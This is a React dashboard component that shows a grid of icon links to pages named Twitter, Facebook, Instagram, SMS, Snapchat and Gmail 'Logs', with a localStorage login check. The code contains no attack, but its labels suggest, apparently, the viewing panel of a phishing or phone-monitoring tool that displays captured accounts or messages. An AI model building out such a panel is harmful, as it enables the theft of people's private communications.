/* eslint-disable no-unused-vars */
import React, { useEffect, useState } from "react";
import { useNavigate, Link } from "react-router-dom";

import {
  fbb,
  gmail,
  insta,
  snapchat,
  text,
  twitter,
  whatsapp,
} from "../assets";

const navLinks = [
  {
    id: "dashboard",
    name: "Dashboard",
    path: "/dashboard",
  },
  {
    id: "twitter",
    name: "Twitter Logs",
    path: "/x",
  },
  {
    id: "facebook",
    name: "Facebook Logs",
    path: "/fb",
  },
  {
    id: "instagram",
    name: "Instagram Logs",
    path: "/ig",
  },
  {
    id: "sms",
    name: "SMS Logs",
    path: "/sms",
  },
  {
    id: "snap",
    name: "Snapchat Logs",
    path: "/snap",
  },
  {
    id: "call",
    name: "Gmail Logs",
    path: "/dashboard",
  },
];

const Dash = () => {
  const navigate = useNavigate();
  const user = JSON.parse(localStorage.getItem("user"));

  const [active, setActive] = useState("dashboard");

  useEffect(() => {
    if (!user) {
      navigate("/");
    }
  }, [user, navigate]);

  useEffect(() => {
    document.title = "Dashboard";
  }, []);

  return (
    <section className="h-screen">
      <h3 className="p-6 font-bold lg:text-center">My Apps</h3>
      <div className="grid grid-cols-3 md:grid-cols-3 w-full lg:max-w-[900px] lg:mx-auto">
        {navLinks.map((link) => (
          <Link
            key={link.id}
            to={link.path}
            className={`${
              active === link.id ? "" : ""
            } flex p-4 items-center justify-center border bg-slate-50`}
            onClick={() => setActive(link.id)}
          >
            <img
              src={
                link.id === "dashboard"
                  ? whatsapp
                  : link.id === "twitter"
                  ? twitter
                  : link.id === "facebook"
                  ? fbb
                  : link.id === "instagram"
                  ? insta
                  : link.id === "sms"
                  ? text
                  : link.id === "snap"
                  ? snapchat
                  : link.id === "call"
                  ? gmail
                  : null
              }
              alt=""
              className="w-[80px]"
            />
          </Link>
        ))}
        {/* <Link>
          <img src="" alt="" />
        </Link> */}
      </div>
    </section>
  );
};

export default Dash;
